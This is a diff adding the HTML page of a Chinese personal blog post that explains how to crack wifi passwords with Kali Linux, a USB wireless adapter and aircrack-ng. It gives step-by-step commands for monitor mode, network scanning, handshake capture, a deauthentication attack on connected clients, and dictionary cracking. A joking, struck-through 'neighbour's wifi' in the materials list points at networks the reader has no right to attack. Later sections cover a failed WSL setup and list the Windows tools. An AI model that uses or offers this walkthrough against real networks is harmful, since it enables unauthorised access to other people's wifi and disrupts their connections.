@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Mistyovo's Blog</title>
+	<link rel="icon" href="/images/favicon.ico" type="image/x-icon">
+
+	<link rel="stylesheet" href="https://mistyovo.xyz/libs/highlight/styles/atom-one-light.css">
+	<link rel="stylesheet" href="https://mistyovo.xyz/libs/font-awesome-pro/css/all.min.css">
+
+
+	<script src="https://registry.npmmirror.com/twikoo/1.6.44/files/dist/twikoo.min.js"></script>
+    <script src="https://mistyovo.xyz/libs/highlight/highlight.min.js"></script>
+	<script src="https://mistyovo.xyz/libs/font-awesome-pro/js/all.min.js"></script>
+
+	<script src="/js/cursor.js"></script>
+	<script src="/js/fadeIn.js"></script>
+	<script src="/js/avatar-rotate.js"></script>
+	<script src="/js/snowfall.js"></script>
+	<script src="/js/backToTop.js"></script>
+	
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+	<div id="container">
+		<div id="wrap">
+			<header>
+    <div class="navbar">
+        <div class="navbar-left">
+            <a href="/" class="navbar-brand">Mistyovo's Blog</a>
+        </div>
+        <div class="navbar-right">
+            <ul class="navbar-menu">
+                <li><a href="/"><i class="fa-solid fa-house"></i> 首页</a></li>
+                <li><a href="/categories"><i class="fa-solid fa-table"></i> 分类</a></li>
+                <li><a href="/archives"><i class="fa-solid fa-box-archive"></i> 归档</a></li>
+                <li><a href="/friends"><i class="fa-solid fa-link"></i> 友链</a></li>
+                <li><a href="/resources"><i class="fa-solid fa-gift"></i> 资源</a></li>
+            </ul>
+        </div>
+    </div>
+</header>
+            <div class="sidebar">
+	<div class="author-info">
+		<div class="avatar">
+			<img id="avatar" src="/images/avatar.jpg" alt="博主头像">
+		</div>
+	</div>
+	<div style="font-size: 20px; font-weight: bold; color: #333; text-align: center; margin: 0 0 20px 0;">
+		Mistyovo
+	</div>
+	<div style="font-size: 14px; color: #aaa; text-align: center; margin: 0 0 20px 0;">
+		天下第一写屎山手请赐教
+	</div>
+	<div class="sidebar-stat">
+		<ul class="sidebar-stats">
+			<li>
+				<p class="stat-value">
+					15
+				</p>
+				<p class="stat-label">随笔</p>
+			</li>
+			<li>
+				<p class="stat-value">
+					0
+				</p>
+				<p class="stat-label">分类</p>
+			</li>
+			<li>
+				<p class="stat-value">
+					9
+				</p>
+				<p class="stat-label">标签</p>
+			</li>
+		</ul>
+	</div>
+	<div class="sidebar-links">
+		<ul class="sidebar-links-list">
+			<li> <a target="_blank" rel="noopener" href="https://space.bilibili.com/400701785"><i class="fa-brands fa-bilibili" style="color: #00aeec"></i> </a> </li>
+			<li> <a target="_blank" rel="noopener" href="https://github.com/Mistyovo"> <i class="fa-brands fa-github-alt" style="color: #5b418b"></i> </a> </li>
+			<li> <a href=""> <i class="fa-brands fa-discord" style="color: #5865f2"></i> </a> </li>
+			<li> <a href=""> <i class="fa-brands fa-weixin" style="color: #38cd7f"></i> </a> </li>
+			<li> <a href=""> <i class="fa-brands fa-qq" style="color: #0099ff"></i> </a> </li>
+			<li> <a target="_blank" rel="noopener" href="https://www.zhihu.com/people/mistyovo"> <i class="fa-solid fa-envelope" style="color: pink"></i> </a> </li>
+		</ul>
+	</div>
+</div>
+            <div class="outer">
+                <section id="main">
+			        <head>
+    <link rel="stylesheet" href="/css/style.styl">
+</head>
+<div class="post">
+    <div class="header-image"></div>
+    <div style="text-align: center;">
+        <h1>kali+无线网卡破解wifi密码</h1>
+        <p style="color: #888"><i class="fa-regular fa-calendar-days"></i> Fri Jul 26 2024 17:39:06 GMT+0800</p>
+        <br>
+    </div>
+    <div>
+    <h1 id="虚拟机-无线网卡（推荐）"><a href="#虚拟机-无线网卡（推荐）" class="headerlink" title="虚拟机+无线网卡（推荐）"></a>虚拟机+无线网卡（推荐）</h1><h2 id="材料准备"><a href="#材料准备" class="headerlink" title="材料准备"></a>材料准备</h2><p>1. 安装有kali虚拟机的电脑，最好别用wsl（会有一些莫名其妙的错误）<br>2. 无线网卡一枚（最好免驱），网购约30元，我使用的是mt7601u<br>3. 字典（自己生成或者网上下载如Top100）<br>4. <del>邻居家的wifi</del></p>
+<h2 id="将无线网卡连接至虚拟机"><a href="#将无线网卡连接至虚拟机" class="headerlink" title="将无线网卡连接至虚拟机"></a>将无线网卡连接至虚拟机</h2><p>请务必先打开kali虚拟机后，后将无线网卡插上电脑。</p>
+<p>这样在VMwwre中才会出现一个弹窗“检测到新的usb设备”选择“连接到虚拟机”，选中你的虚拟机点确定</p>
+<p>打开终端，输入<code>ifconfig</code>，如果列出的表中有<code>wlan0</code>，则说明无线网卡已经成功连接到kali虚拟机中</p>
+<p><img src="https://s2.loli.net/2024/11/28/TAnbiq8o3svLEOp.png" alt=" 2024-11-28 190541.png"></p>
+<h2 id="开启监听模式"><a href="#开启监听模式" class="headerlink" title="开启监听模式"></a>开启监听模式</h2><p>开启网卡监听（注意下面图片中的monitor mode enable，表示监听模式启动）</p>
+<pre><code class="language-bash">airmon-ng start wlan0
+</code></pre>
+<p><img src="https://s2.loli.net/2024/11/28/CPBGWlVsOyNZX3c.png" alt=" 2024-11-28 190808.png"></p>
+<p>扫描附近的wifi，搜索到你要破解的wifi的名字时，及时按下<code>空格</code>暂停扫描，以免扫描的东西不见了，也方便复制：</p>
+<pre><code class="language-bash">airodump-ng wlan0
+</code></pre>
+<table>
+<thead>
+<tr>
+<th align="center">BSSID</th>
+<th align="center">CH</th>
+<th align="center">ESSID</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">wifi的网卡</td>
+<td align="center">信道</td>
+<td align="center">wifi的名字</td>
+</tr>
+</tbody></table>
+<p><img src="https://s2.loli.net/2024/11/28/R3flWUaoHMkh1uX.png" alt=" 2024-11-28 191752.png"></p>
+<p>这时候最好不要按Ctrl+C退出上一步，最好是再打开一个控制台窗口，查看wifi连接的设备</p>
+<pre><code class="language-bash">airodump-ng --bssid &lt;BSSID&gt; -c &lt;CH&gt; -w &lt;文件名不用自己加后缀&gt; wlan0
+</code></pre>
+<p>抓包</p>
+<pre><code class="language-bash">aireplay-ng -0 2 -a &lt;BSSID&gt; -c &lt;STATION&gt; wlan0
+</code></pre>
+<p>参数说明：-0抓取包的个数，-a路由器MAC，-c用户MAC</p>
+<p>破解wifi密码，跑包，如果密码字典中有密码，即可破解成功</p>
+<pre><code class="language-bash">aircrack-ng -w &lt;字典路径&gt; &lt;文件名不用自己加后缀&gt;
+</code></pre>
+<p>停止监听</p>
+<pre><code class="language-bash">airmon stop wlan0
+</code></pre>
+<h1 id="WSL-无线网卡（无效）"><a href="#WSL-无线网卡（无效）" class="headerlink" title="WSL+无线网卡（无效）"></a>WSL+无线网卡（无效）</h1><h2 id="使用USBIPD将无线网卡绑定到WSL"><a href="#使用USBIPD将无线网卡绑定到WSL" class="headerlink" title="使用USBIPD将无线网卡绑定到WSL"></a>使用USBIPD将无线网卡绑定到WSL</h2><p>参考文档：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/wsl/connect-usb">Microsoft-连接USB设备</a></p>
+<p>你有两种方式安装usbipd</p>
+<p>第一种，在GitHub发布页中下载<a target="_blank" rel="noopener" href="https://github.com/dorssel/usbipd-win/releases">https://github.com/dorssel/usbipd-win/releases</a>，下载usbipd-win_x.x.x.msi，然后安装即可</p>
+<p>第二种，如果你的Windows有安装winget，那么可以通过输入命令来安装</p>
+<pre><code class="language-shell">winget install --interactive --exact dorssel.usbipd-win
+</code></pre>
+<p>安装好usbipd后，打开powershell（以管理员模式打开），先别着急打开wsl</p>
+<p>确保你的无线网卡插入了电脑后，输入查看</p>
+<pre><code class="language-shell">usbipd list 
+</code></pre>
+<p><img src="https://s2.loli.net/2024/11/28/spBltRFcGbKHQiN.png" alt=" 2024-11-28 140241.png"></p>
+<p>我们可以看到，我的无线网卡名称为<strong>802.11n USB Wireless LAN Card</strong>，它的<strong>BUSID</strong>为<strong>2-1</strong></p>
+<p>接下来输入命令使无线网卡处于共享状态</p>
+<pre><code class="language-shell">usbipd bind --busid &lt;busid&gt; 
+</code></pre>
+<p><img src="https://s2.loli.net/2024/11/28/ae4GZQ273wJsPbo.png" alt=" 2024-11-28 140719.png"></p>
+<p>通过后面的命令我们可以看到，我的无线网卡已经处于<strong>Shared</strong>的状态，那我们就可以将其绑定到WSL中（在此之前需要先打开WSL，否则可能会报错)：</p>
+<pre><code class="language-shell">usbipd attach --wsl --busid &lt;busid&gt;
+</code></pre>
+<p><img src="https://s2.loli.net/2024/11/28/jdSRNucyM35Aktg.png" alt=" 2024-11-28 141405.png"></p>
+<p>这里附一条解除绑定的命令（别乱输啊），不过官方文档是说也可以通过物理移除的方式（通俗的讲就是直接拔）：</p>
+<pre><code class="language-shell">usbipd detach --busid &lt;busid&gt;
+</code></pre>
+<p>到此，你的Windows可能会弹出一条移除设备的信息，并且在Windows下的WLAN也看不到了两张网卡，这是正常现象，它说明你已经成功的将无线网卡添加到了WSL中。</p>
+<p>我们不妨进一步进行验证 。切换到WSL的窗口，输入<code>lsusb</code>可以查看接入的USB：</p>
+<p><img src="https://s2.loli.net/2024/11/28/2hnLKbeyFcWqkQP.png" alt=" 2024-11-28 141854.png"></p>
+<p>其中的<strong>Ralink Technology, Corp. MT7601U Wireless Adapter</strong>就是我的网卡，显然，USB添加成功了。</p>
+<p>但是，输入<code>ifconfig</code>查看，好家伙没有无线网。。。（好吧，我承认到此我不会了</p>
+<h1 id="Windows-无线网卡"><a href="#Windows-无线网卡" class="headerlink" title="Windows+无线网卡"></a>Windows+无线网卡</h1><p>去<a target="_blank" rel="noopener" href="https://www.aircrack-ng.org/">Aircrack-ng官网</a>下载工具，Windows版本包含以下工具</p>
+<table>
+<thead>
+<tr>
+<th>命令（有用的）</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>airbase-ng</td>
+<td></td>
+</tr>
+<tr>
+<td>aircrack-ng</td>
+<td>最后破解：破解WEP以及WPA（字典攻击）密钥</td>
+</tr>
+<tr>
+<td>airdecap-ng</td>
+<td></td>
+</tr>
+<tr>
+<td>airdecloak-ng</td>
+<td></td>
+</tr>
+<tr>
+<td>aireplay-ng</td>
+<td></td>
+</tr>
+<tr>
+<td>airodump-ng</td>
+<td>数据包嗅探：将无线网络数据输送到PCAP或IVS文件并显示网络信息</td>
+</tr>
+<tr>
+<td>airserv-ng</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+
+    </div>
+    <div id="twikoo"></div>
+    <script>
+        // Twikoo initialization
+        twikoo.init({
+            envId: 'http://101.200.30.183:8080/', // Replace with your Twikoo server URL
+            el: '#twikoo'
+        });
+    </script>
+	<script src="/js/contents.js"></script>
+</div>
+                </section>
+				<footer class="footer">
+	<script>hljs.highlightAll();</script>
+	<div class="footer-content">
+		<div class="footer-content-left">
+			<p>博客观点仅代表作者，与第三方无关</p>
+			<p>© 2018-2025 Mistyovo's Blog. All Rights Reserved.</p>
+		</div>
+		<div class="footer-content-right">
+			<p><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">闽ICP备2025101699号</a></p>
+			<p>Powered by <a href="https://hexo.io" target="_blank">Hexo</a></p>
+		</div>
+	</div>
+</footer>
+            </div>
+		</div>
+	</div>
+</body>
+</html>
